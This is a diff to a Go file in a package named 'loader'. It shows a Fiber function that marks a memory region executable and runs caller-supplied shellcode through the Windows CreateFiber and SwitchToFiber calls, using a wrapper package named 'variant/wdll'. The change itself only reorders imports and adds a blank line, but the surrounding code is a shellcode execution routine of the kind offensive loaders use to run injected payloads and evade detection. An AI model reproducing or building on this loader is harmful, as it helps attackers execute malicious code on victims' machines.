@@ -1,9 +1,10 @@
 package loader
 
 import (
-	"golang.org/x/sys/windows"
 	"unsafe"
 	"variant/wdll"
+
+	"golang.org/x/sys/windows"
 )
 
 func Fiber(shellcode []byte) {
@@ -20,6 +21,7 @@ func Fiber(shellcode []byte) {
 
 	oldProtect := windows.PAGE_EXECUTE_READWRITE
 	_, _, _ = wdll.VirtualAlloc().Call(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+
 	fiber, _, _ := wdll.CreateFiber().Call(0, addr, 0)
 
 	_, _, _ = wdll.SwitchToFiber().Call(fiber)
